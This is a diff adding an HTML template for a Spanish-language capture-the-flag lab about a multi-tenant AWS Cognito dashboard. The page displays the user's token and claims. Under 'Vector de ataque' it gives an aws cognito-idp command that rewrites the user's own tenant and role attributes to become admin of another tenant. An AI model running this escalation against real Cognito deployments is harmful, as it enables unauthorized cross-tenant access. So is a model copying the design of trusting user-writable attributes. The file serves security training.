@@ -1,0 +1,40 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="card" style="margin-bottom: 20px;">
+    <h2 style="margin-top: 0; font-family: 'Space Grotesk', sans-serif;">Lab 4 - Multi-Tenant Dashboard</h2>
+    <p style="color: var(--muted);">La flag aparece cuando el usuario es admin del tenant company_2.</p>
+</div>
+
+<div class="card" style="margin-bottom: 20px;">
+    <h3>Contexto actual</h3>
+    <ul>
+        <li><strong>sub:</strong> <code>{{ user_sub }}</code></li>
+        <li><strong>email:</strong> <code>{{ user_email }}</code></li>
+        <li><strong>email_verified:</strong> <code>{{ email_verified }}</code></li>
+        <li><strong>custom:tenant:</strong> <span class="pill">{{ tenant_in_cognito }}</span></li>
+        <li><strong>custom:role:</strong> <span class="pill {{ badge_class }}">{{ role_in_cognito }}</span></li>
+        <li><strong>Access Token:</strong> <code>{{ token }}</code></li>
+    </ul>
+</div>
+
+<div class="card" style="margin-bottom: 20px;">
+    <h3>Vector de ataque</h3>
+    <p style="color: var(--muted);">Cambia tenant y rol usando el token del usuario.</p>
+    <pre>aws cognito-idp update-user-attributes \
+  --access-token "{{ token }}" \
+  --user-attributes Name="custom:tenant",Value="company_2" Name="custom:role",Value="admin" \
+  --endpoint-url {{ endpoint_url }} \
+  --region {{ region }}</pre>
+</div>
+
+<div class="card">
+    {% if show_flag %}
+    <div class="pill good">Flag obtenida</div>
+    <p style="margin-top: 12px;"><strong>Flag:</strong> {{ flag }}</p>
+    {% else %}
+    <div class="pill">Aun no cumple la condicion</div>
+    {% endif %}
+    <div style="margin-top: 16px;"><a class="btn ghost" href="/lab4/logout">Sign out</a></div>
+</div>
+{% endblock %}
